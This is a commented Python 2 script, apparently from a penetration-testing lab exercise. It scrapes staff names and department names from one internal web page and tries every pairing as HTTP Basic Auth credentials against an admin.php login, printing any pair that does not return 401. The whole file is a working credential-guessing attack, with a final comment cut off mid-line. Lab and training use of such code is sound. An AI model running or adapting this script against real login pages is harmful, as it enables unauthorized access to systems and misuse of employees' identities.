import requests
from bs4 import BeautifulSoup as bs4

def downloadPage(url):                             #a string containing the URL will be the argument
    r = requests.get(url) 
    response = r.content 
    return response                                #the function will return the content of the page via the "response" variable

def findNames(response):                           #web page content (server response) will be an argument to this function
    parser = bs4(response, 'html.parser')
    names = parser.find_all('td', id='name')       #we create a "names" variable and assign to it all elements of type "td" (rows of the table) that have an id attribute of "name". This function will return a list, so the variable name will now be a list of found names, but together with html markups like <td id=...
    output = []
    for name in names:                             #iterate over every element of the "names" list
        output.append(name.text)
    return output 


def findDepts(response):
    parser = bs4(response, 'html.parser')
    names = parser.find_all('td', id='department')
    output = []
    for name in names:
        output.append(name.text)
    return output

def getAuthorized(url, username, password):                      #three arguments will be passed to this function: page url and login credentials
    r = requests.get(url, auth=(username, password))             #initialization of the GET request similar to getting page content, but this time it contains additional parameters of username and password that were passed to this function
    if str(r.status_code) != '401':                              
        print "\n[!] Username: " + username + " Password: " + password + " Code: " + str(r.status_code) + "\n" #print username, password and the non-401 response code that was caused by using them

page = downloadPage("http://192.168.0.120")                       #we use the page URL in order to download content and we store it in the "page" variable

names = findNames(page)                                           #assign a list of names retrieved from function "findNames" to the "names" variable
uniqNames = sorted(set(names))                                    #using function "sorted(set(names))" we extract unique names in case some are repeated

depts = findDepts(page)                                           #assign a list of departments retrieved from function "findDepts" to the "depts" variable
uniqDepts = sorted(set(depts))                                    #using function "sorted(set(depts))" we extract unique department names in case some are repeated

print "[+] Working... "
for name in uniqNames:                                            # loop -- for each name in the list of unique names
    for dept in uniqDepts:          
        getAuthorized("http://172.16.120.120/admin.php", name, dept) #issue an authentication request with every possible combination of name /
